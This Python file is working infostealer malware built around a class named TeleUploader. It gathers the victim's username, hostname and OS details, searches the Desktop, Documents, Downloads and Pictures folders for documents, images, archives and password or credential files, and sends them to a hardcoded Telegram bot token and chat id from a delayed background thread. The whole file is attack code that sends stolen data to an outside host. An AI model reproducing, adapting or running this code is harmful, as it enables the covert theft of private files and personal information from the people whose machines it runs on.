import os
import sys
import json
import threading
import telebot
from datetime import datetime
import subprocess
import platform

class TeleUploader:
    def __init__(self):
        self.token = "7736342272:AAEDD0khPQyyy-PFR0wzio4lBPATmtYsMHc"
        self.chat_id = "7627857345"
        self.bot = None
        self.initialized = False
        
    def initialize_bot(self):
        """Initialize Telegram bot"""
        try:
            self.bot = telebot.TeleBot(self.token, threaded=False)
            self.initialized = True
            return True
        except Exception as e:
            print(f"[!] Bot init failed: {e}")
            return False
    
    def collect_system_info(self):
        """Collect victim system information"""
        info = {
            "timestamp": datetime.now().isoformat(),
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "username": os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'UNKNOWN'),
            "current_dir": os.getcwd(),
            "script_path": sys.argv[0] if len(sys.argv) > 0 else "UNKNOWN"
        }
        
        # Get network info
        try:
            if platform.system() == "Windows":
                hostname = os.environ.get('COMPUTERNAME', 'UNKNOWN')
                info['hostname'] = hostname
            else:
                info['hostname'] = subprocess.getoutput('hostname').strip()
        except:
            info['hostname'] = "UNKNOWN"
        
        return info
    
    def steal_sensitive_files(self):
        """Steal sensitive files from victim"""
        stolen_files = []
        home_dir = os.path.expanduser("~")
        
        # Target directories
        targets = [
            os.path.join(home_dir, "Desktop"),
            os.path.join(home_dir, "Documents"),
            os.path.join(home_dir, "Downloads"),
            os.path.join(home_dir, "Pictures")
        ]
        
        # File extensions to target
        target_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                            '.jpg', '.jpeg', '.png', '.zip', '.rar', '.7z']
        
        for target_dir in targets:
            if os.path.exists(target_dir):
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        if len(stolen_files) >= 15:  # Limit to 15 files
                            break
                        
                        file_path = os.path.join(root, file)
                        file_ext = os.path.splitext(file)[1].lower()
                        
                        if file_ext in target_extensions or file in ['passwords.txt', 'credentials.txt']:
                            try:
                                if os.path.getsize(file_path) < 8 * 1024 * 1024:  # 8MB limit
                                    stolen_files.append(file_path)
                            except:
                                pass
        
        return stolen_files
    
    def send_to_telegram(self, files_to_send=None):
        """Send collected data to Telegram"""
        if not self.initialized:
            if not self.initialize_bot():
                return False
        
        try:
            # Send system info
            sys_info = self.collect_system_info()
            message = f"🎯 *New Victim Connected*\n\n"
            message += f"*User:* `{sys_info['username']}`\n"
            message += f"*System:* `{sys_info['platform']} {sys_info['platform_release']}`\n"
            message += f"*Hostname:* `{sys_info.get('hostname', 'UNKNOWN')}`\n"
            message += f"*Python:* `{sys_info['python_version']}`\n"
            message += f"*Time:* `{sys_info['timestamp']}`"
            
            self.bot.send_message(self.chat_id, message, parse_mode='Markdown')
            
            # Send files if requested
            if files_to_send:
                for file_path in files_to_send[:5]:  # Send first 5 files
                    try:
                        with open(file_path, 'rb') as file:
                            self.bot.send_document(self.chat_id, file)
                    except Exception as e:
                        self.bot.send_message(self.chat_id, f"❌ Failed to send {os.path.basename(file_path)}: {str(e)}")
            
            return True
            
        except Exception as e:
            return False
    
    def start_async(self):
        """Start the uploader in background thread"""
        def runner():
            # Wait a bit before starting
            import time
            time.sleep(10)
            
            # Initialize and send system info
            if self.initialize_bot():
                # Send initial info
                self.send_to_telegram()
                
                # Steal and send files after delay
                time.sleep(30)
                files = self.steal_sensitive_files()
                if files:
                    self.send_to_telegram(files)
        
        thread = threading.Thread(target=runner, daemon=True)
        thread.start()